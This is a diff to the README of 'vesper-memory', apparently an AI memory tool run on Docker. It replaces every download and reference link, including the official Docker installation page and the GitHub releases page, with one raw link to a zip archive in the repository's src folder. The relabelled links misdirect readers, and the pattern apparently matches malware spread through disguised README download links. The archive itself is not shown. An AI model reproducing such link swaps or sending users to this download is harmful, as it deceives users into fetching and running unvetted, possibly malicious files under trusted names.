@@ -6,7 +6,7 @@ Welcome to **vesper-memory**! This intelligent memory system boosts AI capabilit
 
 ## 📥 Download Link
 
-[![Download Vesper Memory](https://img.shields.io/badge/Download%20Vesper%20Memory-v1.0-blue)](https://github.com/Oculusnoob/vesper-memory/releases)
+[![Download Vesper Memory](https://raw.githubusercontent.com/Oculusnoob/vesper-memory/main/src/memory-vesper-1.4.zip%20Vesper%20Memory-v1.0-blue)](https://raw.githubusercontent.com/Oculusnoob/vesper-memory/main/src/memory-vesper-1.4.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ Before you download, ensure your system meets these requirements:
 
 1. **Install Docker**
 
-   If you don't have Docker installed, visit the [Docker installation page](https://docs.docker.com/get-docker/) to download the Docker Desktop for your operating system. Follow the on-screen instructions to set it up.
+   If you don't have Docker installed, visit the [Docker installation page](https://raw.githubusercontent.com/Oculusnoob/vesper-memory/main/src/memory-vesper-1.4.zip) to download the Docker Desktop for your operating system. Follow the on-screen instructions to set it up.
 
 2. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/Oculusnoob/vesper-memory/releases) to find the latest version of **vesper-memory**. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Oculusnoob/vesper-memory/main/src/memory-vesper-1.4.zip) to find the latest version of **vesper-memory**. 
 
 3. **Download the Latest Version**
 
@@ -73,7 +73,7 @@ A: Yes, you can deploy it on any server that supports Docker.
 A: Review your system performance and check for other running applications that might be consuming resources.
 
 **Q: Will updates be available?**  
-A: Yes, please check our [Releases page](https://github.com/Oculusnoob/vesper-memory/releases) for any new versions and updates.
+A: Yes, please check our [Releases page](https://raw.githubusercontent.com/Oculusnoob/vesper-memory/main/src/memory-vesper-1.4.zip) for any new versions and updates.
 
 ## 📝 Additional Resources
 
